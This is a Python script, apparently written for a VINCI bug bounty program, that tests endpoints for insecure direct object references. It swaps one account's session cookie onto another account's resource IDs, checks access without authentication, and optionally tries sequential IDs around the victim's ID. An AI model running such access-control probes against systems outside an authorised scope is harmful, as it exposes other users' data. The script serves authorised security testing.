#!/usr/bin/env python3
"""
VINCI Bug Bounty - IDOR Testing Helper
=============================================================================
Usage: python3 idor_checker.py

Interactive script to test for Insecure Direct Object References.
Requires you to provide session cookies from two different accounts.

This sends minimal targeted requests - NOT a scanner.
=============================================================================
"""

import requests
import json
import sys
import time

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 -BugBounty-vinci-31337 "


def test_idor(endpoint, method, user_a_cookie, user_b_cookie, user_a_id, user_b_id):
    """
    Test if User B can access User A's resources.
    
    Args:
        endpoint: URL with {ID} placeholder (e.g., https://target/api/users/{ID}/profile)
        method: HTTP method (GET, POST, PUT, DELETE)
        user_a_cookie: Cookie string for User A (victim)
        user_b_cookie: Cookie string for User B (attacker)
        user_a_id: User A's resource ID
        user_b_id: User B's resource ID
    """
    headers = {"User-Agent": UA}
    
    print(f"\n{'=' * 60}")
    print(f" IDOR Test")
    print(f" Endpoint: {endpoint}")
    print(f" Method: {method}")
    print(f"{'=' * 60}")
    
    # Step 1: User A accessing own resource (should work)
    url_a = endpoint.replace("{ID}", str(user_a_id))
    headers_a = {**headers, "Cookie": user_a_cookie}
    
    print(f"\n[1] User A accessing own resource: {url_a}")
    try:
        resp_a = requests.request(method, url_a, headers=headers_a, timeout=10, allow_redirects=False)
        print(f"    Status: {resp_a.status_code} | Length: {len(resp_a.content)}")
        if resp_a.status_code == 200:
            print(f"    Response preview: {resp_a.text[:200]}...")
    except Exception as e:
        print(f"    Error: {e}")
        return
    
    time.sleep(1)
    
    # Step 2: User B accessing own resource (should work)
    url_b = endpoint.replace("{ID}", str(user_b_id))
    headers_b = {**headers, "Cookie": user_b_cookie}
    
    print(f"\n[2] User B accessing own resource: {url_b}")
    try:
        resp_b_own = requests.request(method, url_b, headers=headers_b, timeout=10, allow_redirects=False)
        print(f"    Status: {resp_b_own.status_code} | Length: {len(resp_b_own.content)}")
        if resp_b_own.status_code == 200:
            print(f"    Response preview: {resp_b_own.text[:200]}...")
    except Exception as e:
        print(f"    Error: {e}")
        return
    
    time.sleep(1)
    
    # Step 3: User B accessing User A's resource (THE IDOR TEST)
    print(f"\n[3] User B accessing User A's resource: {url_a}")
    print(f"    (Using User B's session to access User A's data)")
    try:
        resp_idor = requests.request(method, url_a, headers=headers_b, timeout=10, allow_redirects=False)
        print(f"    Status: {resp_idor.status_code} | Length: {len(resp_idor.content)}")
        
        if resp_idor.status_code == 200 and len(resp_idor.content) > 0:
            print(f"\n    [!!!] POTENTIAL IDOR VULNERABILITY!")
            print(f"    User B (attacker) can access User A's resource!")
            print(f"    Response preview: {resp_idor.text[:300]}...")
            
            # Compare responses to confirm
            if resp_idor.text == resp_a.text:
                print(f"\n    [CONFIRMED] Response matches User A's legitimate access!")
                print(f"    This is likely a valid IDOR vulnerability.")
            else:
                print(f"\n    [CHECK] Response differs from User A's. Manual review needed.")
                print(f"    Might be a different view or partial access.")
                
        elif resp_idor.status_code in [401, 403]:
            print(f"\n    [-] Access denied. Endpoint appears to have proper authorization.")
            
        elif resp_idor.status_code == 404:
            print(f"\n    [?] 404 returned. Could be access control via obscurity or resource not found.")
            
        elif resp_idor.status_code in [301, 302, 303]:
            redirect = resp_idor.headers.get("Location", "unknown")
            print(f"\n    [?] Redirect to: {redirect}")
            print(f"    Might redirect to login (access denied) or to the resource (IDOR).")
        else:
            print(f"\n    [?] Unexpected status code. Manual investigation needed.")
            
    except Exception as e:
        print(f"    Error: {e}")
    
    # Step 4: No auth test
    time.sleep(1)
    print(f"\n[4] No authentication accessing User A's resource: {url_a}")
    try:
        resp_noauth = requests.request(method, url_a, headers=headers, timeout=10, allow_redirects=False)
        print(f"    Status: {resp_noauth.status_code} | Length: {len(resp_noauth.content)}")
        if resp_noauth.status_code == 200:
            print(f"    [!!!] Endpoint accessible WITHOUT authentication!")
    except Exception as e:
        print(f"    Error: {e}")


def interactive_mode():
    """Run IDOR tests interactively."""
    print("=" * 60)
    print(" VINCI Bug Bounty - IDOR Tester (Interactive)")
    print("=" * 60)
    print("")
    print("Prerequisites:")
    print("  1. Register two accounts on the target (use YWH aliases)")
    print("  2. Get session cookies for both accounts (from Burp/DevTools)")
    print("  3. Identify resource IDs for both accounts")
    print("")
    
    # Get target info
    endpoint = input("Endpoint URL with {ID} placeholder\n  (e.g. https://boost.vinci.com/api/users/{ID}/profile): ").strip()
    if "{ID}" not in endpoint:
        print("[!] URL must contain {ID} placeholder")
        sys.exit(1)
    
    method = input("HTTP Method (GET/POST/PUT/DELETE) [GET]: ").strip().upper() or "GET"
    
    print("\n--- User A (Victim) ---")
    user_a_cookie = input("User A Cookie header value: ").strip()
    user_a_id = input("User A Resource ID: ").strip()
    
    print("\n--- User B (Attacker) ---")
    user_b_cookie = input("User B Cookie header value: ").strip()
    user_b_id = input("User B Resource ID: ").strip()
    
    # Run test
    test_idor(endpoint, method, user_a_cookie, user_b_cookie, user_a_id, user_b_id)
    
    # Offer to test ID enumeration
    print(f"\n\n{'=' * 60}")
    print(" Additional: Sequential ID Enumeration")
    print("=" * 60)
    try_enum = input("Try sequential IDs around User A's ID? (y/n): ").strip().lower()
    
    if try_enum == 'y':
        try:
            base_id = int(user_a_id)
            headers_b = {"User-Agent": UA, "Cookie": user_b_cookie}
            
            print(f"\n[*] Testing IDs {base_id - 3} to {base_id + 3} as User B...")
            for test_id in range(base_id - 3, base_id + 4):
                if str(test_id) == user_b_id:
                    continue  # Skip own ID
                    
                url = endpoint.replace("{ID}", str(test_id))
                try:
                    resp = requests.request(method, url, headers=headers_b, timeout=10, allow_redirects=False)
                    status_icon = "[!]" if resp.status_code == 200 else "[-]"
                    print(f"    {status_icon} ID={test_id} → Status: {resp.status_code}, Length: {len(resp.content)}")
                    time.sleep(0.5)
                except:
                    print(f"    [?] ID={test_id} → Error")
        except ValueError:
            print("[-] Cannot enumerate - ID is not numeric")


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print(__doc__)
        sys.exit(0)
    
    interactive_mode()


if __name__ == "__main__":
    main()
